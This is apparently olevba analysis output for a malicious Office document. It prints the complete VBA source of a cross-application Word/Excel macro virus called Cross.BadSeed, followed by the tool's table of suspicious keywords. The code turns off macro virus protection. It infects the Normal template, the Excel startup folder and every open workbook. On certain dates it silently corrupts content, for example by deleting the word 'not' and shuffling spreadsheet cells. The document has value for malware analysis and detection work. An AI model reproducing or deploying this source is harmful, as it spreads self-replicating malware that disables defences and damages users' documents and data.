olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hopper.n-fd1bc6cf04cc23a62e5c46982fd84277d3ba1d26
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Hopper.n-fd1bc6cf04cc23a62e5c46982fd84277d3ba1d26 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'Cross.BadSeed v0.41 /1nternal
Private InRoutine As Boolean
Private Sub Document_Close()
    On Error Resume Next
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Set nt = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If nt.Lines(1, 1) <> "'<!--1nternal-->" Then
        nt.DeleteLines 1, nt.CountOfLines
        nt.InsertLines 1, ad.Lines(1, ad.CountOfLines)
        Set xlApp = CreateObject("Excel.Application")
        If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
            xlApp.Workbooks.Add.SaveAs xlApp.Application.StartupPath & "\Book1."
            xlApp.Workbooks("Book1.").VBProject.VBComponents.Item("ThisWorkbook").CodeModule.InsertLines 1, nt.Lines(1, nt.CountOfLines)
            xlApp.Workbooks("Book1.").Close SaveChanges:=True
        End If
        xlApp.Application.Quit
    End If
    If ad.Lines(1, 1) <> "'<!--1nternal-->" Then
        ad.DeleteLines 1, ad.CountOfLines
        ad.InsertLines 1, nt.Lines(1, nt.CountOfLines)
    End If
    Select Case Day(Now)
        Case 15 And (Int((10 * Rnd) + 1) = 1)
            ActiveDocument.FollowHyperlink Address:="http://www.sourceofkaos.com/homes/1nternal", NewWindow:=True, AddHistory:=False
        Case 1 And (Int((10 * Rnd) + 1) = 1)
            For i = 1 To ActiveDocument.Characters.Count
                If ActiveDocument.Characters(i).Text = "I" Then ActiveDocument.Characters(i).Text = "1"
            Next
        Case 5 And (Int((10 * Rnd) + 1) = 1)
            For i = 1 To ActiveDocument.Words.Count
                If ActiveDocument.Words(i).Text = "not" Then ActiveDocument.Words(i).Text = ""
            Next
        Case 10 And (Int((15 * Rnd) + 1) = 1)
            With Assistant.NewBalloon
                .Heading = "Cross.BadSeed v0.41"
                .Text = "Programmer:        1nternal" + Chr(13) + "Class Infection:    VicodenES" + Chr(13) + "ActiveX Concept: 1nternal" + Chr(13) + "Book1. Concept:  VicodenES" + Chr(13) + Chr(13) + "1nternal also wishes to thank all contributors and supporters which have made Cross.BadSeed possible."
                .Show
            End With
        Case 20 And (Int((5 * Rnd) + 1) = 1)
            Application.StatusBar = "Cross.BadSeed v0.41 /1nternal"
    End Select
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" And InRoutine <> True Then
        InRoutine = True
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then
            Set WordObj = CreateObject("Word.Application")
            Quit = True
        End If
        Set nt = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        If nt.Lines(1, 1) <> "'<!--1nternal-->" Then
            WordObj.Options.SaveNormalPrompt = False
            nt.DeleteLines 1, nt.CountOfLines
            nt.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """"" + Chr(13) + Chr(10) + "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """"" + Chr(13) + Chr(10) + "End Sub"
            WordObj.Run "Normal.ThisDocument.DisableAV"
            nt.DeleteLines 1, nt.CountOfLines
            nt.InsertLines 1, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines)
        End If
        Set nt = Nothing
        If Quit = True Then WordObj.Application.Quit
        Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        Workbooks("Book1.").Close SaveChanges:=True
    End If
    For i = 1 To Workbooks.Count
        If Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(1, 1) <> "'<!--1nternal-->" Then
            Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.InsertLines 1, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines)
        End If
    Next
    If ActiveWorkbook.Name <> "Book1." Then
        Select Case Day(Now)
            Case 1 And Int((Rnd * 10) + 1) = 1
                For i = 1 To 10
                    ActiveSheet.Cells(Int(Rnd * 100), Int(Rnd * 100)).AddComment "Cross.BadSeed v0.41"
                Next
            Case 10 And Int((Rnd * 3) + 1) = 1
                For f = 1 To 5
                    CellCol = Int(Rnd * 15) + 2
                    For i = 1 To 30
                        Row1 = Int(Rnd * 200) + 10
                        Row2 = Int(Rnd * 200) + 10
                        TempVal = ActiveSheet.Cells(Row1, CellCol)
                        ActiveSheet.Cells(Row1, CellCol) = ActiveSheet.Cells(Row2, CellCol)
                        ActiveSheet.Cells(Row2, CellCol) = TempVal
                    Next
                Next
            Case 15
                Author = "1nternal"
            Case 20 And Int((Rnd * 5) + 1) = 1
                Application.StatusBar = "Cross.BadSeed v0.41 /1nternal"
        End Select
    End If
End Sub

Private Sub Workbook_Open()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.sourceofk|URL                                          |
|          |aos.com/homes/1ntern|                                             |
|          |al                  |                                             |
+----------+--------------------+---------------------------------------------+

